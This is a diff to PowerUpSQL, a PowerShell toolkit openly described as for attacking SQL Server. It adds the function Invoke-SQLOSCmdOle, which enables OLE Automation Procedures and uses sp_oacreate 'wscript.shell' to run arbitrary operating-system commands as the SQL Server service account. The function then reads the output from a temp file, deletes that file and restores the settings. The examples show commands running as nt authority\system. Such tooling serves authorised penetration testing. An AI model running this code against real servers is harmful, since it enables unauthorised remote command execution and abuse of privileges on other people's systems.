@@ -3,7 +3,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Major Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.0.0.82
+        Version: 1.0.0.83
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -1214,6 +1214,384 @@ Function  Invoke-SQLOSCmd
 
                 # Add record
                 $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
+            }
+        }
+
+        # Run scriptblock using multi-threading
+        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
+
+        return $TblResults
+    }
+}
+
+
+# ----------------------------------
+#  Invoke-SQLOSCmdOle
+# ----------------------------------
+# Author: Scott Sutherland
+# Reference: https://technet.microsoft.com/en-us/library/ee156605.aspx
+# Reference: https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option
+Function  Invoke-SQLOSCmdOle
+{
+    <#
+            .SYNOPSIS
+            Execute command on the operating system as the SQL Server service account using OLE automation procedures. 
+            Supports threading, raw output, and table output.
+            .PARAMETER Username
+            SQL Server or domain account to authenticate with.
+            .PARAMETER Password
+            SQL Server or domain account password to authenticate with.
+            .PARAMETER Credential
+            SQL Server credential.
+            .PARAMETER Instance
+            SQL Server instance to connection to.
+            .PARAMETER DAC
+            Connect using Dedicated Admin Connection.
+            .PARAMETER TimeOut
+            Connection time out.
+            .PARAMETER SuppressVerbose
+            Suppress verbose errors.  Used when function is wrapped.
+            .PARAMETER Threads
+            Number of concurrent threads.
+            .PARAMETER Command
+            Operating command to be executed on the SQL Server.
+            .PARAMETER RawResults
+            Just show the raw results without the computer or instance name.
+            .EXAMPLE
+            PS C:\> Get-SQLInstanceLocal | Invoke-SQLOSCmdOle -Verbose -Command "whoami"
+            VERBOSE: Creating runspace pool and session states
+            VERBOSE: MSSQLSRV04 : Connection Failed.
+            VERBOSE: MSSQLSRV04\BOSCHSQL : Connection Success.
+            VERBOSE: MSSQLSRV04\BOSCHSQL : You are not a sysadmin. This command requires sysadmin privileges.
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Connection Success.
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : You are a sysadmin.
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Show Advanced Options is already enabled.
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : OLE Automation Procedues are already enabled.
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Running command: whoami
+            VERBOSE: MSSQLSRV04\SQLSERVER2016 : Connection Failed.
+            VERBOSE: Closing the runspace pool
+
+            ComputerName                                      Instance                                          CommandResults                                   
+            ------------                                      --------                                          --------------                                                                                 
+            MSSQLSRV04                                        MSSQLSRV04\BOSCHSQL                               No sysadmin privileges.                          
+            MSSQLSRV04                                        MSSQLSRV04\SQLSERVER2014                          nt authority\system                              
+            MSSQLSRV04                                        MSSQLSRV04\SQLSERVER2016                          Not Accessible
+
+            .EXAMPLE
+            PS C:\> Invoke-SQLOSCmdOle -Verbose -Instance MSSQLSRV04\SQLSERVER2014 -Command "whoami" -RawResults
+            VERBOSE: Creating runspace pool and session states
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Connection Success.
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : You are a sysadmin.
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Show Advanced Options is disabled.
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Enabled Show Advanced Options.
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Ole Automation Procedures are disabled.
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Enabled Ole Automation Procedures.
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Executing command: whoami
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Reading command output from c:\windows\temp\OlHZP.txt
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Removing file c:\windows\temp\OlHZP.txt
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Disabling 'Ole Automation Procedures
+            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Disabling Show Advanced Options
+
+            nt authority\system
+
+            VERBOSE: Closing the runspace pool
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account to authenticate with.')]
+        [string]$Username,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
+        [string]$Password,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Windows credentials.')]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server instance to connection to.')]
+        [string]$Instance,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Connect using Dedicated Admin Connection.')]
+        [Switch]$DAC,
+
+        [Parameter(Mandatory = $true,
+        HelpMessage = 'OS command to be executed.')]
+        [String]$Command = "whoami",
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Connection timeout.')]
+        [string]$TimeOut,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Number of threads.')]
+        [int]$Threads = 1,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
+        [switch]$SuppressVerbose,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Just show the raw results without the computer or instance name.')]
+        [switch]$RawResults
+    )
+
+    Begin
+    {
+        # Setup data table for output
+        $TblCommands = New-Object -TypeName System.Data.DataTable
+        $TblResults = New-Object -TypeName System.Data.DataTable
+        $null = $TblResults.Columns.Add('ComputerName')
+        $null = $TblResults.Columns.Add('Instance')
+        $null = $TblResults.Columns.Add('CommandResults')
+
+
+        # Setup data table for pipeline threading
+        $PipelineItems = New-Object -TypeName System.Data.DataTable
+
+        # set instance to local host by default
+        if(-not $Instance)
+        {
+            $Instance = $env:COMPUTERNAME
+        }
+
+        # Ensure provided instance is processed
+        if($Instance)
+        {
+            $ProvideInstance = New-Object -TypeName PSObject -Property @{
+                Instance = $Instance
+            }
+        }
+
+        # Add instance to instance list
+        $PipelineItems = $PipelineItems + $ProvideInstance
+    }
+
+    Process
+    {
+        # Create list of pipeline items
+        $PipelineItems = $PipelineItems + $_
+    }
+
+    End
+    {
+        # Define code to be multi-threaded
+        $MyScriptBlock = {
+            $Instance = $_.Instance
+
+            # Parse computer name from the instance
+            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+
+            # Default connection to local default instance
+            if(-not $Instance)
+            {
+                $Instance = $env:COMPUTERNAME
+            }
+
+            # Setup DAC string
+            if($DAC)
+            {
+                # Create connection object
+                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
+            }
+            else
+            {
+                # Create connection object
+                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
+            }
+
+            # Attempt connection
+            try
+            {
+                # Open connection
+                $Connection.Open()
+
+                if(-not $SuppressVerbose)
+                {
+                    Write-Verbose -Message "$Instance : Connection Success."
+                }
+
+                # Switch to track Ole Automation Procedures status
+                $DisableShowAdvancedOptions = 0
+                $DisableOle = 0
+
+                # Get sysadmin status
+                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
+
+                # Check if OLE Automation Procedures are enabled
+                if($IsSysadmin -eq 'Yes')
+                {
+                    Write-Verbose -Message "$Instance : You are a sysadmin."
+                    $IsOleEnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Ole Automation Procedures'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
+                    $IsShowAdvancedEnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
+                }
+                else
+                {
+                    Write-Verbose -Message "$Instance : You are not a sysadmin. This command requires sysadmin privileges."
+
+                    # Add record
+                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",'No sysadmin privileges.')
+                    return
+                }
+
+                # Enable show advanced options if needed
+                if ($IsShowAdvancedEnabled -eq 1)
+                {
+                    Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
+                }
+                else
+                {
+                    Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
+                    $DisableShowAdvancedOptions = 1
+
+                    # Try to enable Show Advanced Options
+                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+
+                    # Check if configuration change worked
+                    $IsShowAdvancedEnabled2 = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
+
+                    if ($IsShowAdvancedEnabled2 -eq 1)
+                    {
+                        Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
+                    }
+                    else
+                    {
+                        Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."
+
+                        # Add record
+                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Could not enable Show Advanced Options.')
+                        return
+                    }
+                }
+
+                # Enable OLE Automation Procedures if needed
+                if ($IsOleEnabled -eq 1)
+                {
+                    Write-Verbose -Message "$Instance : Ole Automation Procedures are already enabled."
+                }
+                else
+                {
+                    Write-Verbose -Message "$Instance : Ole Automation Procedures are disabled."
+                    $DisableOle = 1
+
+                    # Try to enable Ole Automation Procedures
+                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'Ole Automation Procedures',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+
+                    # Check if configuration change worked
+                    $IsOleEnabled2 = Get-SQLQuery -Instance $Instance -Query 'sp_configure "Ole Automation Procedures"' -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
+
+                    if ($IsOleEnabled2 -eq 1)
+                    {
+                        Write-Verbose -Message "$Instance : Enabled Ole Automation Procedures."
+                    }
+                    else
+                    {
+                        Write-Verbose -Message "$Instance : Enabling Ole Automation Procedures failed. Aborting."
+
+                        # Add record
+                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Could not enable Ole Automation Procedures.')
+
+                        return
+                    }
+                }
+
+                # Setup output file
+                $OutputDir = 'c:\windows\temp'
+                $OutputFile = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
+                $OutputPath = "$outputdir\$outputfile.txt"                   
+
+                #  Setup query to run command
+                write-verbose "$instance : Executing command: $Command"               
+                $QueryCmdExecute = 
+@"
+DECLARE @Shell INT
+DECLARE @Output varchar(8000)
+EXEC @Output = Sp_oacreate 'wscript.shell' , @Shell Output
+EXEC Sp_oamethod @shell, 'run' , null, 'cmd.exe /c "$Command > $OutputPath"' 
+"@
+                # Execute query    
+                $null = Get-SQLQuery -Instance $Instance -Query $QueryCmdExecute -Username $Username -Password $Password -Credential $Credential -SuppressVerbose 
+
+                # Setup query for reading command output
+                write-verbose "$instance : Reading command output from $OutputPath"
+                $QueryReadCommandOutput = 
+@"
+DECLARE @fso INT
+DECLARE @file INT
+DECLARE @o int
+DECLARE @f int
+DECLARE @ret int 
+DECLARE @FileContents varchar(8000) 
+EXEC Sp_oacreate 'scripting.filesystemobject' , @fso Output
+EXEC Sp_oamethod @fso, 'opentextfile' , @file Out, '$OutputPath',1
+EXEC sp_oacreate 'scripting.filesystemobject', @o out 
+EXEC sp_oamethod @o, 'opentextfile', @f out, '$OutputPath', 1 
+EXEC @ret = sp_oamethod @f, 'readall', @FileContents out 
+SELECT @FileContents as output
+"@               
+                # Execute query
+                $CmdResults = Get-SQLQuery -Instance $Instance -Query $QueryReadCommandOutput -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property output -ExpandProperty output
+
+                # Remove file
+                write-verbose "$instance : Removing file $OutputPath"
+                $QueryRemoveFile = 
+@"
+DECLARE @Shell INT
+EXEC Sp_oacreate 'wscript.shell' , @shell Output
+EXEC Sp_oamethod @Shell, 'run' , null, 'cmd.exe /c "del $OutputPath"' , '0' , 'true'
+"@
+                # Run query    
+                $null = Get-SQLQuery -Instance $Instance -Query $QueryRemoveFile -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property output -ExpandProperty output
+
+                # Display results or add to final results table
+                if($RawResults)
+                {
+                    $CmdResults
+                }
+                else
+                {
+                    $null = $TblResults.Rows.Add($ComputerName, $Instance, [string]$CmdResults.trim())
+                }
+
+                # Restore 'Ole Automation Procedures state if needed
+                if($DisableOle -eq 1)
+                {
+                    Write-Verbose -Message "$Instance : Disabling 'Ole Automation Procedures"
+                    Get-SQLQuery -Instance $Instance -Query "sp_configure ''Ole Automation Procedures',0;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+                }
+
+                # Restore Show Advanced Options state if needed
+                if($DisableShowAdvancedOptions -eq 1)
+                {
+                    Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
+                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',0;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+                }
+
+                # Close connection
+                $Connection.Close()
+
+                # Dispose connection
+                $Connection.Dispose()
+            }
+            catch
+            {
+                # Connection failed
+
+                if(-not $SuppressVerbose)
+                {
+                    $ErrorMessage = $_.Exception.Message
+                    Write-Verbose -Message "$Instance : Connection Failed."
+                    #Write-Verbose  " Error: $ErrorMessage"
+                }
+
+                # Add record
+                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible or Command Failed')
             }
         }
 
